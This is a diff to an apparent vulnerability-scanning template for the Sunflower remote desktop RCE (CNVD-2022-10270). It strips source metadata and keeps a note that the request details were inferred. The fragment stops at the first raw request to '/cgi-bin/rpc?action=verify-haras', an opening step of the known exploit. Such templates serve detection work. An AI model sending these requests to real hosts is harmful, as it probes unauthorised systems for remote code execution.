@@ -3,13 +3,8 @@ info:
   name: 向日葵远程代码执行漏洞（CNVD-2022-10270）
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/a14685ee99e726f217258aa43887a7bd
-
-    [!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: a14685ee99e726f217258aa43887a7bd
 http:
 - raw:
   - 'GET /cgi-bin/rpc?action=verify-haras HTTP/1.1
